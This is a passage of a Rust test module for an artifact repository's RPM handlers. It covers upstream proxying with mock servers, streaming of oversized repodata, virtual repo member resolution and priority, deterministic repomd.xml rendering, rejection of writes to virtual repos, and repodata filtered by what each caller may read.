        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };

        let server = MockServer::start().await;
        let primary_gz: &[u8] = b"\x1f\x8b\x08mock-primary-xml-gz";
        Mock::given(method("GET"))
            .and(path("/repodata/abc123-primary.xml.gz"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/gzip")
                    .set_body_bytes(primary_gz),
            )
            .mount(&server)
            .await;

        let (state, _dir) = rewire_remote(&fx, &server.uri()).await;
        let app = tdh::router_anon(super::router(), state);

        let (status, body) = tdh::send(
            app,
            tdh::get(format!("/{}/repodata/abc123-primary.xml.gz", fx.repo_key)),
        )
        .await;
        let teardown = || async { fx.teardown().await };
        if status != StatusCode::OK {
            teardown().await;
            panic!("repodata wildcard proxy returned {}", status);
        }
        assert_eq!(&body[..], primary_gz);
        teardown().await;
    }

    /// #3486 (and #2622 before it): a Remote RPM repodata document LARGER than
    /// the buffered-metadata ceiling must still be served.
    ///
    /// Both earlier fixes RAISED a ceiling — 8 MiB DEFAULT -> 128 MiB LARGE —
    /// and pinned the constant with a unit test (`#2664`). Pinning the constant
    /// cannot fail when a real repository simply outgrows the ceiling, and it
    /// cannot fail when a later refactor routes the route through a differently
    /// capped helper: it never touches the route at all. This test drives the
    /// real router with a body one byte past `LARGE_METADATA_MAX_BYTES`, so it
    /// fails for both — ANY byte ceiling on this route, applied anywhere,
    /// turns into the 502 dnf reports as "all mirrors were already tried".
    ///
    /// The body is drained as a stream and only counted, never buffered, so the
    /// assertion is also that the handler streams rather than materialising the
    /// document (`tdh::send` would cap the read at 16 MiB).
    #[tokio::test]
    async fn test_rpm_remote_repodata_serves_document_past_metadata_cap_3486() {
        use futures::StreamExt as _;
        use tower::ServiceExt as _;
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };

        // One byte past the LARGE tier: the exact shape of #3486, where an
        // Oracle Linux 9 `primary.xml.gz` of ~129.5 MiB met the 128 MiB cap.
        let oversized = vec![b'x'; proxy_helpers::LARGE_METADATA_MAX_BYTES + 1];
        let expected_len = oversized.len();
        // createrepo's unique-filename convention: the SHA-256 of the body is
        // the filename prefix, so the content-addressed cache gate is exercised
        // on the real path shape rather than side-stepped.
        let leaf = format!("{}-primary.xml.gz", sha256_hex(&oversized));

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path(format!("/repodata/{}", leaf)))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/gzip")
                    .set_body_bytes(oversized),
            )
            .mount(&server)
            .await;

        let (state, _dir) = rewire_remote(&fx, &server.uri()).await;
        let app = tdh::router_anon(super::router(), state);

        let resp = app
            .oneshot(tdh::get(format!("/{}/repodata/{}", fx.repo_key, leaf)))
            .await
            .expect("oneshot");

        let teardown = || async { fx.teardown().await };
        if resp.status() != StatusCode::OK {
            let status = resp.status();
            teardown().await;
            panic!(
                "repodata document of {} bytes returned {} (a byte ceiling is still \
                 applied to this route — #3486)",
                expected_len, status
            );
        }

        let mut stream = resp.into_body().into_data_stream();
        let mut served = 0usize;
        while let Some(chunk) = stream.next().await {
            served += chunk.expect("body chunk").len();
        }
        if served != expected_len {
            teardown().await;
            panic!("served {} bytes, expected {}", served, expected_len);
        }
        teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_remote_upstream_proxy_serves_root_rpm() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };

        let server = MockServer::start().await;
        let rpm_bytes: &[u8] = b"fake-rpm-binary";
        // Many real-world repos (e.g. packages.gitlab.com) host the RPMs
        // at the repository root, not under /packages/. The catch-all
        // upstream_proxy route covers that layout.
        Mock::given(method("GET"))
            .and(path("/gitlab-runner-1.0.0-1.x86_64.rpm"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/x-rpm")
                    .set_body_bytes(rpm_bytes),
            )
            .mount(&server)
            .await;

        let (state, _dir) = rewire_remote(&fx, &server.uri()).await;
        let app = tdh::router_anon(super::router(), state);

        let (status, body) = tdh::send(
            app,
            tdh::get(format!("/{}/gitlab-runner-1.0.0-1.x86_64.rpm", fx.repo_key)),
        )
        .await;
        let teardown = || async { fx.teardown().await };
        if status != StatusCode::OK {
            teardown().await;
            panic!("upstream_proxy returned {}", status);
        }
        assert_eq!(&body[..], rpm_bytes);
        teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_local_repomd_still_generated_from_artifacts() {
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let app = f.router_anon(super::router());
        let (status, body) = tdh::send(
            app,
            tdh::get(format!("/{}/repodata/repomd.xml", f.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        // Hosted repos keep the local-generation behaviour: an empty repo
        // still emits the repomd shell that references primary.xml.gz.
        let text = std::str::from_utf8(&body).unwrap_or("");
        assert!(text.contains("<repomd"));
        assert!(text.contains("primary.xml.gz"));
        f.teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_hosted_upstream_proxy_404s() {
        // Hosted repos must NOT honour the catch-all proxy route; otherwise
        // a typo'd local download would unexpectedly hit the internet (or
        // 502 confusingly). The route should 404 instead.
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let app = f.router_anon(super::router());
        let (status, _) = tdh::send(
            app,
            tdh::get(format!("/{}/some-random-name.rpm", f.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        f.teardown().await;
    }

    // -----------------------------------------------------------------------
    // #3573: a Virtual RPM repo over Remote members must resolve the catch-all
    // through its members. Real yum layouts put repodata and packages under a
    // prefix (`el9/x86_64/repodata/repomd.xml`, `.../Packages/foo.rpm`), which
    // never reaches the explicit `/repodata/` and `/packages/` routes; before
    // the fix the catch-all 404'd every non-Remote repo, so dnf saw an empty
    // repository and installed nothing.
    // -----------------------------------------------------------------------

    /// Create a public Remote RPM member pointed at `upstream_url` and link it
    /// to the fixture's Virtual repo at `priority`.
    async fn link_remote_member(
        fx: &tdh::Fixture,
        upstream_url: &str,
        priority: i32,
    ) -> uuid::Uuid {
        let (member_id, _key, _dir) = tdh::create_repo(&fx.pool, "remote", "rpm").await;
        // Anonymous probes only see public members (#3323); the subject here
        // is the member walk, not authorization.
        tdh::publish_repo(&fx.pool, member_id).await;
        sqlx::query("UPDATE repositories SET upstream_url = $1 WHERE id = $2")
            .bind(upstream_url)
            .bind(member_id)
            .execute(&fx.pool)
            .await
            .expect("set member upstream_url");
        sqlx::query(
            "INSERT INTO virtual_repo_members (virtual_repo_id, member_repo_id, priority) \
             VALUES ($1, $2, $3)",
        )
        .bind(fx.repo_id)
        .bind(member_id)
        .bind(priority)
        .execute(&fx.pool)
        .await
        .expect("insert virtual member");
        member_id
    }

    async fn unlink_member(fx: &tdh::Fixture, member_id: uuid::Uuid) {
        sqlx::query("DELETE FROM virtual_repo_members WHERE member_repo_id = $1")
            .bind(member_id)
            .execute(&fx.pool)
            .await
            .ok();
        sqlx::query("DELETE FROM repositories WHERE id = $1")
            .bind(member_id)
            .execute(&fx.pool)
            .await
            .ok();
    }

    #[tokio::test]
    async fn test_rpm_virtual_upstream_proxy_walks_remote_members_3573() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(fx) = tdh::Fixture::setup("virtual", "rpm").await else {
            return;
        };

        // Two upstreams with a yum layout under a prefix. `first` (priority 0)
        // serves the repodata and the shared package; `second` (priority 1)
        // serves both of those too, plus a package only it has.
        let first = MockServer::start().await;
        let second = MockServer::start().await;
        let first_repomd: &[u8] = b"<repomd>first</repomd>";
        let second_repomd: &[u8] = b"<repomd>second</repomd>";
        let first_shared: &[u8] = b"first-shared-rpm";
        let second_shared: &[u8] = b"second-shared-rpm";
        let second_only: &[u8] = b"second-only-rpm";
        for (server, repomd, shared) in [
            (&first, first_repomd, first_shared),
            (&second, second_repomd, second_shared),
        ] {
            Mock::given(method("GET"))
                .and(path("/el9/x86_64/repodata/repomd.xml"))
                .respond_with(
                    ResponseTemplate::new(200)
                        .insert_header("content-type", "application/xml")
                        .set_body_bytes(repomd),
                )
                .mount(server)
                .await;
            Mock::given(method("GET"))
                .and(path("/el9/x86_64/Packages/shared-1.0-1.x86_64.rpm"))
                .respond_with(
                    ResponseTemplate::new(200)
                        .insert_header("content-type", "application/x-rpm")
                        .set_body_bytes(shared),
                )
                .mount(server)
                .await;
        }
        Mock::given(method("GET"))
            .and(path("/el9/x86_64/Packages/only-1.0-1.x86_64.rpm"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/x-rpm")
                    .set_body_bytes(second_only),
            )
            .mount(&second)
            .await;

        let first_id = link_remote_member(&fx, &first.uri(), 0).await;
        let second_id = link_remote_member(&fx, &second.uri(), 1).await;

        let dir = tempfile::tempdir().expect("tempdir");
        let proxy = tdh::build_proxy_service_with_fs(fx.pool.clone(), dir.path().to_str().unwrap());
        let state =
            tdh::build_state_with_proxy(fx.pool.clone(), dir.path().to_str().unwrap(), proxy);

        let mut failures = Vec::new();
        let cases: [(&str, Option<&[u8]>); 4] = [
            // Metadata under the prefix: served by the first member that has it.
            ("el9/x86_64/repodata/repomd.xml", Some(first_repomd)),
            // Both members serve it: priority order decides.
            (
                "el9/x86_64/Packages/shared-1.0-1.x86_64.rpm",
                Some(first_shared),
            ),
            // Only the lower-priority member has it: the walk falls through.
            (
                "el9/x86_64/Packages/only-1.0-1.x86_64.rpm",
                Some(second_only),
            ),
            // Neither member has it.
            ("el9/x86_64/Packages/missing-1.0-1.x86_64.rpm", None),
        ];
        for (rel, expected) in cases {
            let app = tdh::router_anon(super::router(), state.clone());
            let (status, body) =
                tdh::send(app, tdh::get(format!("/{}/{}", fx.repo_key, rel))).await;
            match expected {
                Some(bytes) => {
                    if status != StatusCode::OK || &body[..] != bytes {
                        failures.push(format!(
                            "{rel}: expected 200 with {:?}, got {status} with {:?}",
                            String::from_utf8_lossy(bytes),
                            String::from_utf8_lossy(&body)
                        ));
                    }
                }
                None => {
                    if status != StatusCode::NOT_FOUND {
                        failures.push(format!("{rel}: expected 404, got {status}"));
                    }
                }
            }
        }

        unlink_member(&fx, first_id).await;
        unlink_member(&fx, second_id).await;
        fx.teardown().await;
        assert!(
            failures.is_empty(),
            "virtual RPM catch-all must resolve through members (#3573): {failures:#?}"
        );
    }

    // -----------------------------------------------------------------------
    // Additional coverage for the #1447 fix: every repodata sibling handler
    // (primary/filelists/other/updateinfo) must also short-circuit to the
    // upstream proxy for Remote repos, repomd_xml.asc must proxy the
    // detached signature, and repodata_proxy must 404 for Hosted repos
    // (otherwise dnf's hash-prefixed lookups would silently 502).
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn test_rpm_remote_repodata_sibling_handlers_all_proxy_upstream() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };

        let server = MockServer::start().await;
        // Each sibling handler advertises a different default content type
        // upstream; wiremock just needs to echo deterministic bodies so the
        // test can confirm each handler proxied the right path.
        let primary: &[u8] = b"\x1f\x8bPRIMARY";
        let filelists: &[u8] = b"\x1f\x8bFILELISTS";
        let other: &[u8] = b"\x1f\x8bOTHER";
        let updateinfo: &[u8] = b"\x1f\x8bUPDATEINFO";

        for (p, body) in [
            ("/repodata/primary.xml.gz", primary),
            ("/repodata/filelists.xml.gz", filelists),
            ("/repodata/other.xml.gz", other),
            ("/repodata/updateinfo.xml.gz", updateinfo),
        ] {
            Mock::given(method("GET"))
                .and(path(p))
                .respond_with(
                    ResponseTemplate::new(200)
                        .insert_header("content-type", "application/gzip")
                        .set_body_bytes(body),
                )
                .mount(&server)
                .await;
        }

        let (state, _dir) = rewire_remote(&fx, &server.uri()).await;
        let teardown = || async { fx.teardown().await };

        for (suffix, expected) in [
            ("repodata/primary.xml.gz", primary),
            ("repodata/filelists.xml.gz", filelists),
            ("repodata/other.xml.gz", other),
            ("repodata/updateinfo.xml.gz", updateinfo),
        ] {
            let app = tdh::router_anon(super::router(), state.clone());
            let (status, body) =
                tdh::send(app, tdh::get(format!("/{}/{}", fx.repo_key, suffix))).await;
            if status != StatusCode::OK {
                teardown().await;
                panic!("{} proxy returned {}", suffix, status);
            }
            assert_eq!(&body[..], expected, "wrong body for {}", suffix);
        }

        teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_remote_repomd_asc_proxies_upstream_signature() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };

        let server = MockServer::start().await;
        let sig: &[u8] =
            b"-----BEGIN PGP SIGNATURE-----\nupstream-sig\n-----END PGP SIGNATURE-----\n";
        Mock::given(method("GET"))
            .and(path("/repodata/repomd.xml.asc"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/pgp-signature")
                    .set_body_bytes(sig),
            )
            .mount(&server)
            .await;

        let (state, _dir) = rewire_remote(&fx, &server.uri()).await;
        let app = tdh::router_anon(super::router(), state);
        let (status, body) = tdh::send(
            app,
            tdh::get(format!("/{}/repodata/repomd.xml.asc", fx.repo_key)),
        )
        .await;

        let teardown = || async { fx.teardown().await };
        if status != StatusCode::OK {
            teardown().await;
            panic!("repomd.xml.asc proxy returned {}", status);
        }
        assert_eq!(&body[..], sig);
        teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_repodata_wildcard_404s_for_hosted_repos() {
        // The /repodata/*path catch-all must 404 on Hosted repos. Without
        // this guard, dnf's hash-prefixed metadata fetches would return
        // the wrong status and confuse the client.
        let Some(f) = tdh::Fixture::setup("local", "rpm").await else {
            return;
        };
        let app = f.router_anon(super::router());
        let (status, _) = tdh::send(
            app,
            tdh::get(format!("/{}/repodata/abc123-primary.xml.gz", f.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        f.teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_upstream_proxy_404s_when_proxy_service_unavailable() {
        // Remote repo with NO proxy_service wired into SharedState (the
        // default fixture state). upstream_proxy reaches the
        // `(upstream_url, proxy) = (_, None)` fallback and must 404
        // rather than panic. Covers the cache-miss + no-proxy branch.
        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };
        let app = fx.router_anon(super::router());
        let (status, _) =
            tdh::send(app, tdh::get(format!("/{}/some-package.rpm", fx.repo_key))).await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        fx.teardown().await;
    }

    #[tokio::test]
    async fn test_rpm_repodata_proxy_404s_for_remote_without_proxy_service() {
        // Same idea for /repodata/*path catch-all: without a wired
        // proxy_service, try_proxy_repodata returns Ok(None) and the
        // handler falls through to 404. Also drives every branch of
        // the content-type suffix detection (.xml, .asc, default).
        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };
        for suffix in [
            "repodata/abc-primary.xml",
            "repodata/repomd.xml.asc",
            "repodata/random-blob",
        ] {
            let app = fx.router_anon(super::router());
            let (status, _) =
                tdh::send(app, tdh::get(format!("/{}/{}", fx.repo_key, suffix))).await;
            assert_eq!(status, StatusCode::NOT_FOUND, "expected 404 for {}", suffix);
        }
        fx.teardown().await;
    }

    // -----------------------------------------------------------------------
    // build_rpm_package_response (#1608 streaming response builder)
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn test_build_rpm_package_response_headers_and_streamed_body() {
        // The Content-Length MUST come from the supplied `size_bytes`
        // (the stored artifact size), NOT from re-reading the streamed body.
        // This pins the #1608 contract: the body is streamed via
        // `Body::from_stream`, yet the length header is exact.
        let payload: &[u8] = b"fake-rpm-payload-bytes";
        let stream = futures::stream::iter(vec![
            Ok::<bytes::Bytes, crate::error::AppError>(Bytes::from_static(b"fake-rpm-")),
            Ok(Bytes::from_static(b"payload-bytes")),
        ]);
        let body = Body::from_stream(stream);

        let resp = build_rpm_package_response(
            body,
            "gitlab-runner-1.0.0-1.x86_64.rpm",
            payload.len() as i64,
            "abc123checksum",
        );

        assert_eq!(resp.status(), StatusCode::OK);
        let headers = resp.headers();
        assert_eq!(
            headers.get(CONTENT_TYPE).unwrap(),
            HeaderValue::from_static("application/x-rpm")
        );
        assert_eq!(
            headers.get(CONTENT_LENGTH).unwrap(),
            HeaderValue::from_str(&payload.len().to_string()).unwrap()
        );
        assert_eq!(
            headers.get("Content-Disposition").unwrap(),
            HeaderValue::from_static("attachment; filename=\"gitlab-runner-1.0.0-1.x86_64.rpm\"")
        );
        assert_eq!(
            headers.get("X-Checksum-SHA256").unwrap(),
            HeaderValue::from_static("abc123checksum")
        );

        // The streamed body must reassemble to the exact original bytes.
        let collected = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
            .await
            .expect("collect streamed rpm body");
        assert_eq!(&collected[..], payload);
    }

    #[tokio::test]
    async fn test_build_rpm_package_response_content_length_independent_of_body() {
        // Even when the body is empty, Content-Length reflects the stored
        // size_bytes argument — the builder never inspects the stream.
        let resp =
            build_rpm_package_response(Body::empty(), "pkg-2.0-1.noarch.rpm", 4096, "deadbeef");
        assert_eq!(
            resp.headers().get(CONTENT_LENGTH).unwrap(),
            HeaderValue::from_static("4096")
        );
    }

    // -----------------------------------------------------------------------
    // upstream_proxy local cache-hit streams the cached .rpm (#1608)
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn test_rpm_upstream_proxy_local_cache_hit_streams_bytes() {
        // A remote repo with a previously-cached .rpm must serve the local
        // copy by STREAMING it (get_stream + Body::from_stream) rather than
        // buffering, while emitting the right bytes and a Content-Length
        // taken from the stored size_bytes.
        use tower::ServiceExt;

        let Some(fx) = tdh::Fixture::setup("remote", "rpm").await else {
            return;
        };

        let rpm_bytes = Bytes::from_static(b"cached-rpm-binary-contents-1234567890");
        let filename = "cached-pkg-1.2.3-1.x86_64.rpm";
        let storage_key = format!("rpm/{}/{}", fx.repo_id, filename);
        let repo = fx.repo_info("remote", Some("http://upstream.invalid"));

        tdh::seed_artifact(
            &fx.state,
            &fx.pool,
            &repo,
            &storage_key,
            &format!("packages/{}", filename),
            "cached-pkg",
            "1.2.3-1",
            "application/x-rpm",
            rpm_bytes.clone(),
            fx.user_id,
        )
        .await;

        let app = fx.router_anon(super::router());
        let req = tdh::get(format!("/{}/{}", fx.repo_key, filename));
        let resp = app.oneshot(req).await.expect("send cache-hit request");

        let teardown = || async { fx.teardown().await };
        if resp.status() != StatusCode::OK {
            let status = resp.status();
            teardown().await;
            panic!("cache-hit returned {}", status);
        }

        let content_length = resp
            .headers()
            .get(CONTENT_LENGTH)
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string());
        let checksum_header = resp
            .headers()
            .get("X-Checksum-SHA256")
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string());

        let body = axum::body::to_bytes(resp.into_body(), 16 * 1024 * 1024)
            .await
            .expect("collect cache-hit body");

        teardown().await;

        assert_eq!(
            &body[..],
            &rpm_bytes[..],
            "cache-hit body must match stored bytes"
        );
        assert_eq!(
            content_length.as_deref(),
            Some(rpm_bytes.len().to_string().as_str()),
            "Content-Length must equal stored size_bytes"
        );
        // seed_artifact stores checksum "test-seed"; verify it is surfaced.
        assert_eq!(checksum_header.as_deref(), Some("test-seed"));
    }

    // -----------------------------------------------------------------------
    // #1780: repomd.xml must carry <revision>, <open-checksum>, <open-size>
    // so stricter DNF/createrepo clients accept the metadata.
    // -----------------------------------------------------------------------

    #[test]
    fn test_generate_repomd_xml_content_has_revision_and_open_metadata() {
        let xml = generate_repomd_xml_content(&[]);
        // Top-level revision element present exactly once.
        assert!(xml.contains("<revision>"), "missing <revision>: {xml}");
        // Each of the four <data> blocks gets open-checksum + open-size.
        assert_eq!(
            xml.matches("<open-checksum type=\"sha256\">").count(),
            4,
            "expected 4 <open-checksum> elements: {xml}"
        );
        assert_eq!(
            xml.matches("<open-size>").count(),
            4,
            "expected 4 <open-size> elements: {xml}"
        );
    }

    /// **The determinism gate (#2636).**
    ///
    /// `repomd.xml` and `repomd.xml.asc` render this document independently,
    /// one request apart, and the client verifies the second render's
    /// signature against the first render's bytes. So the render must depend
    /// on repository state and nothing else — above all, not on the clock.
    ///
    /// The `sleep` is the whole point: this stamped `SystemTime::now()` into
    /// `<revision>` and every `<data><timestamp>`, so back-to-back renders
    /// agreed ~99.9% of the time and *looked* fine. Crossing a second boundary
    /// is what exposes it — and is exactly what a real `dnf` run does between
    /// fetching the two URLs.
    #[test]
    fn test_repomd_render_is_byte_identical_over_unchanged_state() {
        let artifacts = vec![RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: "packages/det-1.0-1.x86_64.rpm".to_string(),
            name: "det".to_string(),
            version: Some("1.0-1".to_string()),
            size_bytes: 4096,
            checksum_sha256: "feed".to_string(),
            storage_key: "rpm/det.rpm".to_string(),
            metadata: None,
            updated_at: test_updated_at(),
        }];

        let first = generate_repomd_xml_content(&artifacts);
        std::thread::sleep(std::time::Duration::from_millis(1100));
        let second = generate_repomd_xml_content(&artifacts);

        assert_eq!(
            first, second,
            "unchanged repository state must render byte-identical repomd.xml across a \
             second boundary; a wall-clock read in the render makes repomd.xml.asc sign \
             different bytes than repomd.xml serves",
        );
    }

    /// The epoch must come from repository state, not the clock: it equals the
    /// newest artifact's `updated_at`, and an empty repo pins to 0.
    #[test]
    fn test_repomd_revision_is_the_repo_state_epoch() {
        let mk = |secs: i64| RpmArtifact {
            id: uuid::Uuid::new_v4(),
            path: format!("packages/p-{secs}.rpm"),
            name: format!("p{secs}"),
            version: Some("1.0-1".to_string()),
            size_bytes: 1,
            checksum_sha256: "aa".to_string(),
            storage_key: format!("rpm/p-{secs}.rpm"),
            metadata: None,
            updated_at: chrono::TimeZone::timestamp_opt(&chrono::Utc, secs, 0).unwrap(),
        };

        let xml = generate_repomd_xml_content(&[mk(1_600_000_000), mk(1_700_000_000)]);
        assert!(
            xml.contains("<revision>1700000000</revision>"),
            "<revision> must be the most recent artifact updated_at: {xml}"
        );
        assert_eq!(
            xml.matches("<timestamp>1700000000</timestamp>").count(),
            4,
            "every <data><timestamp> must carry the repo-state epoch: {xml}"
        );

        let empty = generate_repomd_xml_content(&[]);
        assert!(
            empty.contains("<revision>0</revision>"),
            "an empty repo has no state to date, and must not fall back to now(): {empty}"
        );
    }

    #[test]
    fn test_generate_repomd_open_checksum_matches_uncompressed_primary() {
        // The primary <open-checksum> must equal sha256 of the *uncompressed*
        // primary.xml, while the regular <checksum> hashes the gzipped blob.
        let xml = generate_repomd_xml_content(&[]);
        let primary_xml = generate_primary_xml(&[]);
        let expected_open = sha256_hex(primary_xml.as_bytes());
        assert!(
            xml.contains(&format!(
                "<open-checksum type=\"sha256\">{expected_open}</open-checksum>"
            )),
            "primary open-checksum should hash the uncompressed primary.xml"
        );
        // And the compressed checksum must differ from the open one.
        let primary_gz_sha = sha256_hex(&gzip_bytes(primary_xml.as_bytes()));
        assert_ne!(expected_open, primary_gz_sha);
        assert!(xml.contains(&format!(
            "<checksum type=\"sha256\">{primary_gz_sha}</checksum>"
        )));
    }

    // -----------------------------------------------------------------------
    // #1780: PUT/POST to a virtual RPM repo must return 405 (not 400), to
    // match the remote-repo response.
    // -----------------------------------------------------------------------

    #[test]
    fn test_reject_rpm_write_virtual_returns_405() {
        let err = reject_rpm_write_if_not_hosted("virtual").unwrap_err();
        assert_eq!(err.status(), StatusCode::METHOD_NOT_ALLOWED);
    }

    #[test]
    fn test_reject_rpm_write_remote_returns_405() {
        let err = reject_rpm_write_if_not_hosted("remote").unwrap_err();
        assert_eq!(err.status(), StatusCode::METHOD_NOT_ALLOWED);
    }

    #[test]
    fn test_reject_rpm_write_local_is_ok() {
        assert!(reject_rpm_write_if_not_hosted("local").is_ok());
    }

    #[tokio::test]
    async fn test_rpm_upload_virtual_405() {
        let Some(f) = tdh::Fixture::setup("virtual", "rpm").await else {
            return;
        };
        let app = f.router_with_auth(super::router());
        let req = tdh::put(
            format!("/{}/packages/foo-1.0-1.x86_64.rpm", f.repo_key),
            bytes::Bytes::from_static(b"data"),
        );
        let (status, _) = tdh::send(app, req).await;
        assert_eq!(status, StatusCode::METHOD_NOT_ALLOWED);
        f.teardown().await;
    }

    // -----------------------------------------------------------------------
    // #1780: Virtual repo repodata must aggregate member packages instead of
    // reporting packages="0".
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn test_rpm_virtual_repomd_aggregates_member_packages() {
        use flate2::read::GzDecoder;
        use std::io::Read;

        let Some(f) = tdh::Fixture::setup("virtual", "rpm").await else {
            return;
        };

        // Create a hosted member repo and seed an RPM artifact into it.
        let (member_id, _member_key, _member_dir) = tdh::create_repo(&f.pool, "local", "rpm").await;
        // The probe is anonymous and the subject is aggregation, not
        // authorization: since #4346 the repodata lists only members the
        // caller may read.
        tdh::publish_repo(&f.pool, member_id).await;
        let member_repo =
            tdh::make_repo_info(member_id, "rpm-virt-member", &f.storage_dir, "local", None);
        tdh::seed_artifact(
            &f.state,
            &f.pool,
            &member_repo,
            "rpm/member/agg-1.0-1.x86_64.rpm",
            "packages/agg-1.0-1.x86_64.rpm",
            "agg",
            "1.0-1",
            "application/x-rpm",
            bytes::Bytes::from_static(b"member-rpm-bytes"),
            f.user_id,
        )
        .await;

        // Wire the membership: virtual (f.repo_id) -> member.
        sqlx::query(
            "INSERT INTO virtual_repo_members (virtual_repo_id, member_repo_id, priority) \
             VALUES ($1, $2, 0)",
        )
        .bind(f.repo_id)
        .bind(member_id)
        .execute(&f.pool)
        .await
        .expect("insert virtual member");

        // primary.xml.gz must report 1 package (decompress and inspect).
        let app = f.router_anon(super::router());
        let (status, body) = tdh::send(
            app,
            tdh::get(format!("/{}/repodata/primary.xml.gz", f.repo_key)),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        let mut decoder = GzDecoder::new(&body[..]);
        let mut primary = String::new();
        decoder
            .read_to_string(&mut primary)
            .expect("decompress primary.xml.gz");
        assert!(
            primary.contains("packages=\"1\""),
            "virtual primary.xml should aggregate the member package, got: {primary}"
        );
        assert!(primary.contains("<name>agg</name>"));

        // Cleanup the extra member repo + membership.
        sqlx::query("DELETE FROM virtual_repo_members WHERE virtual_repo_id = $1")
            .bind(f.repo_id)
            .execute(&f.pool)
            .await
            .ok();
        sqlx::query("DELETE FROM artifacts WHERE repository_id = $1")
            .bind(member_id)
            .execute(&f.pool)
            .await
            .ok();
        sqlx::query("DELETE FROM repositories WHERE id = $1")
            .bind(member_id)
            .execute(&f.pool)
            .await
            .ok();
        f.teardown().await;
    }

    // -----------------------------------------------------------------------
    // #4346 (the #3323 deferred item): a virtual's repodata describes only the
    // members the CALLER may read, the render cache never hands one caller
    // another's document, and the detached signature covers the document the
    // same caller is served.
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn test_4346_virtual_repodata_lists_only_members_the_caller_can_read() {
        use flate2::read::GzDecoder;
        use std::io::Read;

        let Some(f) = tdh::Fixture::setup("virtual", "rpm").await else {
            return;
        };
        tdh::publish_repo(&f.pool, f.repo_id).await;
        let pubkey_armor = attach_signing_key(&f, "gpg").await;

        // Three members: public, private, internal, one package each.
        let mut members = Vec::new();
        let mut member_keys = Vec::new();
        for (label, visibility) in [
            ("pubpkg", "public"),
            ("privpkg", "private"),
            ("intpkg", "internal"),
        ] {
            let (member_id, member_key, _dir) = tdh::create_repo(&f.pool, "local", "rpm").await;
            sqlx::query(
                "UPDATE repositories SET visibility = $2::repository_visibility WHERE id = $1",
            )
            .bind(member_id)
            .bind(visibility)
            .execute(&f.pool)
            .await
            .expect("set member visibility");
            let info = tdh::make_repo_info(member_id, &member_key, &f.storage_dir, "local", None);
            tdh::seed_artifact(
                &f.state,
                &f.pool,
                &info,
                &format!("rpm/{label}/{label}-1.0-1.x86_64.rpm"),
                &format!("packages/{label}-1.0-1.x86_64.rpm"),
                label,
                "1.0-1",
                "application/x-rpm",
                bytes::Bytes::from(format!("{label}-bytes")),
                f.user_id,
            )
            .await;
            sqlx::query(
                "INSERT INTO virtual_repo_members (virtual_repo_id, member_repo_id, priority) \
                 VALUES ($1, $2, 0)",
            )
            .bind(f.repo_id)
            .bind(member_id)
            .execute(&f.pool)
            .await
            .expect("insert virtual member");
            members.push(member_id);
            member_keys.push(member_key);
        }
        let private_id = members[1];
        // The fixture user holds a read grant on the private member; a second
        // authenticated user holds nothing.
        tdh::grant_repo_access(&f.pool, private_id, f.user_id).await;
        let (outsider_id, outsider_name) = tdh::create_user(&f.pool).await;

        #[derive(Clone, Copy)]
        enum Caller {
            Anonymous,
            Outsider,
            Insider,
            // The fixture user through a repository-scoped token that covers
            // the public member only. The virtual is public, so the token
            // reaches it without naming it, and gets no #4559 parent term.
            Scoped,
            // The same user through a token scoped to the virtual only: the
            // #4559 parent term reaches every member the user may read.
            VirtualScoped,
        }
        let public_id = members[0];
        let fetch = |caller: Caller, file: &'static str| {
            let router = match caller {
                Caller::Anonymous => f.router_anon(super::router()),
                Caller::Outsider => tdh::router_with_auth(
                    super::router(),
                    f.state.clone(),
                    tdh::make_auth(outsider_id, &outsider_name),
                ),
                Caller::Insider => f.router_with_auth(super::router()),
                Caller::Scoped => {
                    let mut auth = tdh::make_auth(f.user_id, &f.username);
                    auth.allowed_repo_ids =
                        crate::models::access_scope::AccessScope::Restricted(vec![public_id]);
                    tdh::router_with_auth(super::router(), f.state.clone(), auth)
                }
                Caller::VirtualScoped => {
                    let mut auth = tdh::make_auth(f.user_id, &f.username);
                    auth.allowed_repo_ids =
